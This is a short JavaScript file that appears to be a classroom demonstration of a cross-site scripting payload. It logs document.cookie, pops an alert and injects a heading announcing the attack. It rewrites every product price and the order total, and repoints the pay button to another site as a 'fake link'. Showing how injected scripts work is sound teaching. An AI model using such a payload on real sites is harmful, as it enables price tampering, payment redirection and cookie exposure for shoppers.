console.log(document);
console.log(window);
console.log(document.cookie);

alert('XSS attacked!');
let container = document.getElementsByClassName('container')[0];
const title = document.createElement('h1');
title.setAttribute('class', 'changed');
title.innerHTML = `You are under attack by Xss, an attack script that inserts.`;
container.appendChild(title);
let productPrice = document.querySelectorAll('.product__price');
productPrice.forEach((item) => {
    item.innerHTML = `$50`;
    item.setAttribute('class', 'changed');
});

let button = document.getElementById('pay');
button.classList.add("changed");
const total = document.getElementById('total');
total.setAttribute('class', 'changed');
total.innerHTML = '200';
const payLink = document.getElementById('pay');
payLink.innerText = `I am a fake link and I will go to anthor website`;
payLink.setAttribute('href', 'https://brightspace.algonquincollege.com/d2l/home/568451');


